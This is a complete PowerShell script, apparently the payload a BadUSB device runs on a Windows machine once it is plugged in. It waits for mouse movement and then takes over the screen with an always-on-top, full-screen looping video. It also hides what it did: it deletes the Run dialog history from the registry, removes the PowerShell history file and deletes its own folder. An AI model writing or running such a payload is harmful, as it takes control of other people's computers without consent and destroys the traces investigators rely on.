[string] $location = "$env:tmp\vsbadusbpayload"

function main {
    pressCapsLock
    waitForMouseMove
    playVideoLoop "$location\video.mp4"
    clearRunHistory
    clearPowershellHistory
    removePayloadDirectory
}

function pressCapsLock() {
    $comObject = New-Object -ComObject WScript.Shell
    $comObject.SendKeys('{CapsLock}')
}

function waitForMouseMove {
    Add-Type -AssemblyName System.Windows.Forms
    $cursorPosition = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        if ([Windows.Forms.Cursor]::Position.X -ne $cursorPosition) {
            break
        }
        
        Start-Sleep -Milliseconds 1000
    }
}

function playVideoLoop([uri] $source) {
    Add-Type -AssemblyName PresentationFramework
    [string] $windowName = "VideoPlayer"

    [xml] $windowConfig = @"
        <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                Title="PowerShell Video Player"
                Topmost="True"
                WindowState="Maximized"
                WindowStyle="None"
                ResizeMode="NoResize"
                WindowStartupLocation="CenterScreen">
            <MediaElement Stretch="Fill" Name="${windowName}" Volume="1" LoadedBehavior="Manual" UnloadedBehavior="Stop">
                <MediaElement.Triggers>
                    <EventTrigger RoutedEvent="MediaElement.Loaded">
                        <EventTrigger.Actions>
                            <BeginStoryboard>
                                <Storyboard>
                                    <MediaTimeline Source="${source}" Storyboard.TargetName="${windowName}" RepeatBehavior="Forever" />
                                </Storyboard>
                            </BeginStoryboard>
                        </EventTrigger.Actions>
                    </EventTrigger>
                </MediaElement.Triggers>
            </MediaElement>
        </Window>
"@

    $xmlReader = (New-Object System.Xml.XmlNodeReader $windowConfig)
    $window = [Windows.Markup.XamlReader]::Load($xmlReader)
    $player = $window.FindName($windowName)
    $player.Play()
    $window.ShowDialog() | out-null
}

function clearRunHistory {
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
}

function clearPowershellHistory {
    $historyLocation = (Get-PSreadlineOption).HistorySavePath    
    if (Test-Path $historyLocation) {
        Remove-Item $historyLocation
    }
}

function removePayloadDirectory {
    Remove-Item "$location" -Recurse -Force -ErrorAction SilentlyContinue
}

main
